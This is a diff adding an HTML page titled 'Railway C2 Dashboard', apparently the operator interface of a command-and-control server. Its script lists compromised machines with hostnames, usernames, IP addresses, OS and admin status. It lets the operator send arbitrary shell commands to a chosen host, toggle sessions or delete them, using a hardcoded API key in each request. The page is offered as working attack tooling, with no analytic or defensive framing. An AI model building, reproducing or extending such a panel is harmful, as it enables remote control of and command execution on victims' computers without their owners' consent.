@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>🟢 Railway C2 Dashboard</title>
+    <style>
+        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+        .session { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; border-radius: 4px; }
+        .session .online { color: #0f0; font-weight: bold; }
+        .session .offline { color: #f44; font-weight: bold; }
+        .admin { color: #ff0; font-weight: bold; }
+        button { margin: 5px 5px 0 0; padding: 6px 10px; font-family: monospace; cursor: pointer; background: #000; color: #0f0; border: 1px solid #0f0; border-radius: 3px; }
+        button:hover { background: #0f0; color: #000; }
+    </style>
+</head>
+<body>
+    <h1>🟢 Railway C2 Dashboard</h1>
+    <div id="sessionList">Loading sessions...</div>
+
+    <script>
+        function refreshSessions() {
+            fetch('/api/sessions')
+                .then(res => res.json())
+                .then(data => displaySessions(data.sessions || []))
+                .catch(err => {
+                    document.getElementById('sessionList').innerHTML = '<p style="color:red">❌ Error loading sessions</p>';
+                    console.error(err);
+                });
+        }
+
+        function displaySessions(sessions) {
+            const container = document.getElementById('sessionList');
+            if (sessions.length === 0) {
+                container.innerHTML = '<p>🎯 No active sessions detected</p>';
+                return;
+            }
+
+            let html = '';
+            sessions.forEach(session => {
+                const lastSeen = new Date((session.last_seen || '').replace(' ', 'T'));
+                const isActive = Date.now() - lastSeen.getTime() < 300000;
+                const statusClass = isActive ? 'online' : 'offline';
+                const status = isActive ? 'ONLINE' : 'OFFLINE';
+                const adminBadge = session.admin_status ? '<span class="admin">[ADMIN]</span>' : '';
+
+                html += `
+                    <div class="session">
+                        <strong>${session.hostname}</strong> ${adminBadge}
+                        <div class="${statusClass}">Status: ${status}</div>
+                        <div>👤 ${session.username} | 🌐 ${session.ip_address}</div>
+                        <div>🖥️ ${session.os_info || 'Unknown OS'} | ⏰ ${lastSeen.toLocaleString()}</div>
+                        <div>
+                            <button onclick="sendCommand('${session.hostname}')">🚀 Befehl senden</button>
+                            <button onclick="toggleStatus('${session.hostname}')">🟢/🔴 Status ändern</button>
+                            <button onclick="deleteSession('${session.hostname}')">❌ Löschen</button>
+                        </div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        function sendCommand(hostname) {
+            const cmd = prompt(`Befehl an ${hostname} senden:`);
+            if (!cmd) return;
+            fetch('/api/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ session: hostname, command: cmd, api_key: 'hitrun2024' })
+            })
+            .then(r => r.json())
+            .then(d => alert(d.message || '✅ Gesendet'))
+            .catch(err => alert('❌ Fehler: ' + err));
+        }
+
+        function toggleStatus(hostname) {
+            fetch('/api/toggle-status', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hostname, api_key: 'hitrun2024' })
+            }).then(() => refreshSessions());
+        }
+
+        function deleteSession(hostname) {
+            if (!confirm(`❌ ${hostname} wirklich löschen?`)) return;
+            fetch('/api/delete-session', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hostname, api_key: 'hitrun2024' })
+            }).then(() => refreshSessions());
+        }
+
+        refreshSessions();
+        setInterval(refreshSessions, 10000);
+    </script>
+</body>
+</html>
